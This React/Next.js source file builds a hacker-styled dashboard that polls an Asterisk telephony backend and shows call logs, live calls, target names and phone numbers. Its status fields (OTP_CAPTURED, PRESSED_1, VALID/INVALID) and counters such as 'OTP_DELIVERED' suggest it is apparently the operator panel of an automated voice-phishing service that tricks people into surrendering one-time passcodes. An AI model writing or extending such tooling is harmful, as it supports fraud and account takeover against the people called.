"use client";
import { useState, useEffect, useCallback } from "react";
import { useAuth } from "@/lib/auth";
import {
  LayoutDashboard, Phone, Activity, Shield, TrendingUp, Clock,
  Database, PhoneCall, PhoneOff, CheckCircle2, XCircle, AlertTriangle,
  RefreshCw, Radio,
} from "lucide-react";

const BACKEND_URL = "/api/proxy";

interface CallLog {
  call_id: string;
  target_number?: string;
  target_name?: string;
  service_name?: string;
  call_type?: string;
  status?: string;
  step?: string;
  timestamp?: string;
  duration?: number;
  from_number?: string;
  updates?: Array<{ step: string; message: string; timestamp: string }>;
}

const TERMINAL_OK = new Set(["ENDED", "VALID", "PRESSED_0"]);
const TERMINAL_FAIL = new Set(["BUSY", "NOANSWER", "REJECTED", "MACHINE", "ERROR", "INVALID"]);

function classifyCall(log: CallLog): "success" | "failed" | "active" {
  const s = log.status || log.step || "";
  if (TERMINAL_OK.has(s)) return "success";
  if (TERMINAL_FAIL.has(s)) return "failed";
  if (["CALLING", "ANSWERED", "HUMAN", "OTP_CAPTURED", "PRESSED_1", "DTMF", "AMD_NOTSURE"].includes(s)) return "active";
  if (s === "ENDED") return "success";
  return "active";
}

function fmtDuration(sec?: number): string {
  if (!sec) return "—";
  const m = Math.floor(sec / 60).toString().padStart(2, "0");
  const s = (sec % 60).toString().padStart(2, "0");
  return `${m}:${s}`;
}

function timeAgo(ts?: string): string {
  if (!ts) return "—";
  const diff = Date.now() - new Date(ts).getTime();
  if (diff < 60000) return "Just now";
  if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
  if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
  return `${Math.floor(diff / 86400000)}d ago`;
}

export default function DashboardPage() {
  const { token } = useAuth();
  const [logs, setLogs] = useState<CallLog[]>([]);
  const [activeCalls, setActiveCalls] = useState<CallLog[]>([]);
  const [loading, setLoading] = useState(true);

  const fetchData = useCallback(async () => {
    try {
      const [logsRes, activeRes] = await Promise.all([
        fetch(BACKEND_URL + "/api/asterisk/logs?limit=200", {
          headers: { "X-USER-TOKEN": token },
          credentials: "omit",
        }),
        fetch(BACKEND_URL + "/api/asterisk/active_calls", {
          headers: { "X-USER-TOKEN": token },
          credentials: "omit",
        }),
      ]);
      if (logsRes.ok) {
        const data = await logsRes.json();
        setLogs(Array.isArray(data) ? data : data.logs || []);
      }
      if (activeRes.ok) {
        const data = await activeRes.json();
        setActiveCalls(Array.isArray(data) ? data : data.calls || []);
      }
    } catch { /* silently fail */ }
    setLoading(false);
  }, [token]);

  useEffect(() => {
    fetchData();
    const id = setInterval(fetchData, 8000);
    return () => clearInterval(id);
  }, [fetchData]);

  // Compute stats
  const totalCalls = logs.length;
  const successCalls = logs.filter(l => classifyCall(l) === "success").length;
  const failedCalls = logs.filter(l => classifyCall(l) === "failed").length;
  const successRate = totalCalls > 0 ? Math.round((successCalls / totalCalls) * 100) : 0;
  const otpDelivered = logs.filter(l => {
    const s = l.status || l.step || "";
    return ["OTP_CAPTURED", "VALID", "INVALID", "PRESSED_1"].includes(s);
  }).length;
  const durations = logs.filter(l => l.duration && l.duration > 0).map(l => l.duration!);
  const avgDuration = durations.length > 0 ? Math.round(durations.reduce((a, b) => a + b, 0) / durations.length) : 0;

  const stats = [
    { label: "CALLS_EXECUTED", value: totalCalls.toString(), icon: Phone, color: "var(--green-matrix)", glow: "rgba(0,255,65,0.3)" },
    { label: "SUCCESS_RATE", value: totalCalls > 0 ? `${successRate}%` : "—", icon: TrendingUp, color: "var(--cyan-hack)", glow: "rgba(0,255,224,0.3)" },
    { label: "OTP_DELIVERED", value: otpDelivered.toString(), icon: Shield, color: "var(--amber-warn)", glow: "rgba(255,171,0,0.3)" },
    { label: "AVG_DURATION", value: avgDuration > 0 ? fmtDuration(avgDuration) : "—", icon: Clock, color: "var(--purple-sys)", glow: "rgba(176,64,255,0.3)" },
  ];

  // Recent activity (last 15)
  const recentLogs = [...logs].reverse().slice(0, 15);

  return (
    <div className="page-content" style={{ padding: "20px 24px" }}>
      <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "6px" }}>
        <LayoutDashboard size={14} color="var(--green-dim)" />
        <span style={{ fontFamily: "var(--font-mono)", fontSize: "10px", color: "var(--text-muted)" }}>/root/dashboard.sys</span>
      </div>
      <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "20px" }}>
        <h1 style={{ fontFamily: "var(--font-display)", fontSize: "18px", fontWeight: 700, color: "var(--green-matrix)", letterSpacing: "0.08em", textShadow: "0 0 20px rgba(0,255,65,0.5)" }}>
          SYSTEM_DASHBOARD
        </h1>
        <button className="hbtn hbtn-ghost" style={{ padding: "4px 10px", fontSize: "9px", marginLeft: "auto" }} onClick={() => { setLoading(true); fetchData(); }}>
          <RefreshCw size={10} className={loading ? "anim-spin" : ""} /> REFRESH
        </button>
      </div>

      {/* Stats */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(160px, 1fr))", gap: "14px", marginBottom: "20px" }}>
        {stats.map(({ label, value, icon: Icon, color, glow }) => (
          <div key={label} className="cyber-panel" style={{ padding: "14px 16px" }}>
            <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "10px" }}>
              <Icon size={13} color={color} style={{ filter: `drop-shadow(0 0 4px ${glow})` }} />
              <span style={{ fontFamily: "var(--font-mono)", fontSize: "9px", color: "var(--text-muted)", letterSpacing: "0.06em" }}>{label}</span>
            </div>
            <div style={{ fontFamily: "var(--font-display)", fontSize: "24px", fontWeight: 700, color, textShadow: `0 0 12px ${glow}` }}>{value}</div>
          </div>
        ))}
      </div>

      {/* Active Calls */}
      {activeCalls.length > 0 && (
        <div className="cyber-panel" style={{ marginBottom: "16px" }}>
          <div className="panel-header">
            <Radio size={13} color="var(--green-matrix)" />
            <span className="panel-header-label">ACTIVE_CALLS</span>
            <span className="cyber-badge green" style={{ marginLeft: "auto" }}>{activeCalls.length} LIVE</span>
          </div>
          <div style={{ padding: "0 16px 14px" }}>
            {activeCalls.map((call, i) => (
              <div key={call.call_id || i} style={{ display: "flex", alignItems: "center", gap: "12px", padding: "8px 0", borderBottom: i < activeCalls.length - 1 ? "1px solid var(--border-subtle)" : "none" }}>
                <span className="status-pip green" />
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ fontFamily: "var(--font-mono)", fontSize: "11px", color: "var(--text-secondary)" }}>
                    {call.target_name || "Unknown"} → {call.target_number || "—"}
                  </div>
                  <div style={{ fontFamily: "var(--font-mono)", fontSize: "9px", color: "var(--text-muted)" }}>
                    {call.call_type || call.service_name || "—"} // {call.status || call.step || "ACTIVE"}
                  </div>
                </div>
                <span className="cyber-badge green"><PhoneCall size={9} /> LIVE</span>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Recent Activity */}
      <div className="cyber-panel">
        <div className="panel-header">
          <Activity size={13} color="var(--green-dim)" />
          <span className="panel-header-label">RECENT_ACTIVITY</span>
          <span className="bracket-label">[LAST {recentLogs.length}]</span>
        </div>
        <div style={{ padding: "0 16px 16px" }}>
          {recentLogs.length === 0 ? (
            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", minHeight: "140px", gap: "10px" }}>
              <Database size={28} style={{ opacity: 0.1 }} color="var(--green-matrix)" />
              <p style={{ fontFamily: "var(--font-mono)", fontSize: "11px", color: "var(--text-muted)" }}>
                // no call logs yet — execute calls to populate
              </p>
            </div>
          ) : (
            <div style={{ overflowX: "auto" }}>
              <table style={{ width: "100%", borderCollapse: "collapse" }}>
                <thead>
                  <tr>
                    {["STATUS", "TARGET", "TYPE", "STEP", "TIME"].map(h => (
                      <th key={h} style={{ padding: "8px 10px", textAlign: "left", fontFamily: "var(--font-mono)", fontSize: "9px", color: "var(--text-ghost)", letterSpacing: "0.08em", borderBottom: "1px solid var(--border-subtle)" }}>{h}</th>
                    ))}
                  </tr>
                </thead>
                <tbody>
                  {recentLogs.map((log, i) => {
                    const cls = classifyCall(log);
                    const pipColor = cls === "success" ? "green" : cls === "failed" ? "red" : "amber";
                    return (
                      <tr key={log.call_id || i} style={{ borderBottom: "1px solid var(--border-subtle)" }}>
                        <td style={{ padding: "8px 10px" }}><span className={`status-pip ${pipColor}`} /></td>
                        <td style={{ padding: "8px 10px" }}>
                          <div style={{ fontFamily: "var(--font-mono)", fontSize: "11px", color: "var(--text-secondary)" }}>{log.target_name || "—"}</div>
                          <div style={{ fontFamily: "var(--font-mono)", fontSize: "9px", color: "var(--text-muted)" }}>{log.target_number || "—"}</div>
                        </td>
                        <td style={{ padding: "8px 10px", fontFamily: "var(--font-mono)", fontSize: "10px", color: "var(--text-muted)" }}>{log.call_type || log.service_name || "—"}</td>
                        <td style={{ padding: "8px 10px" }}>
                          <span className={`cyber-badge ${cls === "success" ? "green" : cls === "failed" ? "red" : "amber"}`}>
                            {log.status || log.step || "—"}
                          </span>
                        </td>
                        <td style={{ padding: "8px 10px", fontFamily: "var(--font-mono)", fontSize: "10px", color: "var(--text-ghost)" }}>{timeAgo(log.timestamp)}</td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
